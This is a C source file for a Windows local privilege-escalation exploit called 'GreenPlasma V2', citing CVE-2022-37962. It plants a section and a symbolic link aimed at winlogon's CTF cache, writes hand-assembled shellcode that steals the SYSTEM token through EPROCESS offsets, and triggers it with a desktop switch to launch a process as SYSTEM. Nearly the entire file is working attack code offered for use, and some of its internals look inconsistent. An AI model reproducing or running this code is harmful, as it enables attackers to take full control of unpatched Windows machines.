#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#ifndef SYMBOLIC_LINK_ALL_ACCESS
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
#endif

#ifndef ViewUnmap
#define ViewUnmap 2
#endif

#define SHELLCODE_SIZE 0x200
#define SC_WINEXEC_ADDR 0x100
#define SC_CMD_STRING 0x108

typedef NTSTATUS (NTAPI *pNtCreateSymbolicLinkObject)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtOpenSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

typedef struct {
    pNtCreateSymbolicLinkObject NtCreateSymbolicLinkObject;
    pNtMapViewOfSection        NtMapViewOfSection;
    pNtClose                   NtClose;
    pNtCreateSection           NtCreateSection;
    pNtOpenSection             NtOpenSection;
} NT_FUNCS;

typedef struct {
    DWORD eprocess_links_offset;
    DWORD eprocess_pid_offset;
    DWORD eprocess_token_offset;
    DWORD thread_eprocess_offset;
} KRNL_OFFSETS;

static int init_nt_functions(NT_FUNCS *funcs) {
    ZeroMemory(funcs, sizeof(*funcs));
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    funcs->NtCreateSection = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    funcs->NtCreateSymbolicLinkObject = (pNtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    funcs->NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    funcs->NtClose = (pNtClose)GetProcAddress(ntdll, "NtClose");
    funcs->NtOpenSection = (pNtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    
    if (!funcs->NtCreateSection || !funcs->NtCreateSymbolicLinkObject || 
        !funcs->NtMapViewOfSection || !funcs->NtClose) {
        printf("[-] Failed to get NT functions\n");
        return 0;
    }
    
    printf("[+] All NT functions obtained directly from ntdll\n");
    return 1;
}

static void resolve_kernel_offsets(KRNL_OFFSETS *ko) {
    ZeroMemory(ko, sizeof(*ko));
    ko->thread_eprocess_offset = 0xB8;
    ko->eprocess_links_offset = 0x448;
    ko->eprocess_pid_offset = 0x440;
    ko->eprocess_token_offset = 0x4B8;
    
    printf("[+] Kernel offsets:\n");
    printf("    Thread->EPROCESS:    +0x%X\n", ko->thread_eprocess_offset);
    printf("    EPROCESS.Links:      +0x%X\n", ko->eprocess_links_offset);
    printf("    EPROCESS.PID:        +0x%X\n", ko->eprocess_pid_offset);
    printf("    EPROCESS.Token:      +0x%X\n", ko->eprocess_token_offset);
}

static void build_shellcode(PBYTE buf, KRNL_OFFSETS *ko, FARPROC winExec) {
    static const BYTE raw_sc[] = {
        0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52,
        0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x9C, 0x48,
        0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x48, 0x81, 0xE5,
        0x00, 0xF0, 0xFF, 0xFF, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00,
        0x00, 0x48, 0x8B, 0x40, 0xB8, 0x49, 0x89, 0xC4, 0x48, 0x8D, 0xB8, 0x48,
        0x04, 0x00, 0x00, 0x4D, 0x89, 0xFF, 0xEB, 0x1B, 0x48, 0x8B, 0x3F, 0x4D,
        0x39, 0xFF, 0x74, 0x1A, 0x48, 0x89, 0xF8, 0x48, 0x83, 0xE8, 0x48, 0x4C,
        0x39, 0xE0, 0x74, 0xEA, 0x48, 0x8B, 0x80, 0x40, 0x04, 0x00, 0x00, 0x48,
        0x83, 0xF8, 0x04, 0x75, 0xE0, 0x49, 0x89, 0xFD, 0x49, 0x81, 0xED, 0x48,
        0x04, 0x00, 0x00, 0x49, 0x8B, 0x85, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x25,
        0xF0, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0x84, 0x24, 0xB8, 0x04, 0x00, 0x00,
        0x48, 0x8B, 0x85, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x08, 0x01,
        0x00, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x20, 0xFF,
        0xD0, 0x48, 0x83, 0xC4, 0x20, 0x48, 0x83, 0xC4, 0x28, 0x9D, 0x41, 0x5F,
        0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
        0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0xC3
    };
    
    ZeroMemory(buf, SHELLCODE_SIZE);
    memcpy(buf, raw_sc, sizeof(raw_sc));
    
    *(BYTE*)(buf + 0x2E) = (BYTE)ko->thread_eprocess_offset;
    *(DWORD*)(buf + 0x37) = ko->eprocess_links_offset;
    *(BYTE*)(buf + 0x45) = (BYTE)(ko->eprocess_links_offset & 0xFF);
    *(DWORD*)(buf + 0x53) = ko->eprocess_pid_offset;
    *(DWORD*)(buf + 0x6E) = ko->eprocess_links_offset;
    *(DWORD*)(buf + 0x77) = ko->eprocess_token_offset;
    *(DWORD*)(buf + 0x86) = ko->eprocess_token_offset;
    
    *(ULONG64*)(buf + SC_WINEXEC_ADDR) = (ULONG64)winExec;
    const char *cmd = "notepad.exe";
    strcpy((char*)(buf + SC_CMD_STRING), cmd);
}

static DWORD get_session_id(void) {
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    return sid;
}

static DWORD find_winlogon_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    DWORD pid = 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { 
            pid = pe.th32ProcessID; 
            break; 
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

int main(void) {
    DWORD sessId = get_session_id();
    DWORD winlogonPid = find_winlogon_pid();
    NT_FUNCS nt = { 0 };
    KRNL_OFFSETS ko = { 0 };
    
    printf("=== GreenPlasma V2 - Final Test ===\n");
    printf("[+] Session: %u | Winlogon PID: %u\n", sessId, winlogonPid);
    
    if (!winlogonPid) {
        printf("[-] No winlogon.exe found\n");
        return 1;
    }
    
    printf("[*] Phase 0: Getting NT functions from ntdll...\n");
    if (!init_nt_functions(&nt)) {
        printf("[-] Failed to get NT functions\n");
        return 1;
    }
    
    printf("[*] Phase 1: Kernel offsets...\n");
    resolve_kernel_offsets(&ko);
    
    // Create our section
    printf("[*] Phase 2: Creating section...\n");
    HANDLE hSection = NULL;
    LARGE_INTEGER size = { .QuadPart = 0x1000 };
    UNICODE_STRING u;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    const wchar_t *sectionName = L"\\BaseNamedObjects\\CTFMON_DEAD";
    
    printf("[*] Using section name: %S\n", sectionName);
    RtlInitUnicodeString(&u, sectionName);
    InitializeObjectAttributes(&oa, &u, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    NTSTATUS st = nt.NtCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, &size,
                                      PAGE_READWRITE, SEC_COMMIT, NULL);
    if (st == 0xC0000035) { // STATUS_OBJECT_NAME_COLLISION
        printf("[*] Section already exists, trying to open it...\n");
        st = nt.NtOpenSection(&hSection, SECTION_ALL_ACCESS, &oa);
    }
    
    if (st < 0) {
        printf("[-] Failed to create/open section: 0x%08lX\n", st);
        return 1;
    }
    printf("[+] Section ready: %p\n", hSection);
    
    // Create or replace symlink
    printf("[*] Phase 3: Creating/replacing symlink...\n");
    wchar_t symName[256];
    swprintf(symName, 256, L"\\Sessions\\%u\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%u", sessId, sessId);
    printf("[*] Symlink path: %S\n", symName);
    printf("[*] Symlink target: %S\n", sectionName);
    
    UNICODE_STRING uSym, uTarget;
    RtlInitUnicodeString(&uSym, symName);
    RtlInitUnicodeString(&uTarget, sectionName);
    
    // Try to delete existing symlink first by opening with DELETE access
    HANDLE hSymlink = NULL;
    InitializeObjectAttributes(&oa, &uSym, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    // First attempt: create with OPENIF (opens if exists)
    st = nt.NtCreateSymbolicLinkObject(&hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &uTarget);
    if (st == 0xC0000061) { // STATUS_OBJECT_NAME_COLLISION
        printf("[*] Symlink exists, trying to replace it...\n");
        // Try to open with delete access
        InitializeObjectAttributes(&oa, &uSym, OBJ_CASE_INSENSITIVE, NULL, NULL);
        st = nt.NtOpenSection((PHANDLE)&hSymlink, DELETE, &oa);
        if (st >= 0) {
            // Delete it
            nt.NtClose(hSymlink);
            hSymlink = NULL;
            // Create fresh
            InitializeObjectAttributes(&oa, &uSym, OBJ_CASE_INSENSITIVE, NULL, NULL);
            st = nt.NtCreateSymbolicLinkObject(&hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &uTarget);
        }
    }
    
    if (st < 0) {
        printf("[-] Symlink operation failed: 0x%08lX\n", st);
        if (st == 0xC0000022) {
            printf("[!] ACCESS_DENIED - The symlink vulnerability (CVE-2022-37962) is likely patched on this system\n");
            printf("[!] This exploit requires an unpatched Windows 10 1803-1903 or special bypass\n");
        }
        nt.NtClose(hSection);
        return 1;
    }
    printf("[+] Symlink ready: %p\n", hSymlink);
    
    // Map the section
    printf("[*] Phase 4: Mapping section...\n");
    PVOID viewBase = NULL;
    SIZE_T viewSize = 0x1000;
    st = nt.NtMapViewOfSection(hSection, GetCurrentProcess(),
        &viewBase, 0, 0x1000, NULL, &viewSize,
        ViewUnmap, 0, PAGE_READWRITE);
    if (st < 0) {
        printf("[-] MapView failed: 0x%08lX\n", st);
        nt.NtClose(hSection);
        nt.NtClose(hSymlink);
        return 1;
    }
    printf("[+] Section mapped at %p\n", viewBase);
    
    // Plant shellcode
    printf("[*] Phase 5: Planting shellcode...\n");
    FARPROC we = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!we) {
        printf("[-] No WinExec\n");
        return 1;
    }
    
    BYTE sc[SHELLCODE_SIZE];
    build_shellcode(sc, &ko, we);
    
    ZeroMemory(viewBase, 0x1000);
    memcpy((PBYTE)viewBase + 0x100, sc, SHELLCODE_SIZE);
    *(ULONG64*)((PBYTE)viewBase + 0x08) = (ULONG64)((PBYTE)viewBase + 0x100);
    printf("[+] Shellcode planted at offset 0x100\n");
    printf("[+] Callback pointer at offset 0x08 -> shellcode\n");
    
    // Trigger
    printf("[*] Phase 6: Triggering callback via desktop switch...\n");
    printf("[!] If vulnerable, winlogon will execute our shellcode as SYSTEM\n");
    SwitchDesktop(GetThreadDesktop(GetCurrentThreadId()));
    
    printf("[*] Waiting 10 seconds for shellcode execution...\n");
    Sleep(10000);
    
    printf("[+] Exploit completed.\n");
    printf("[*] Check if notepad.exe (SYSTEM) appeared.\n");
    
    // Cleanup
    nt.NtClose(hSection);
    nt.NtClose(hSymlink);
    
    printf("[*] Press Enter to exit\n");
    getchar();
    return 0;
}
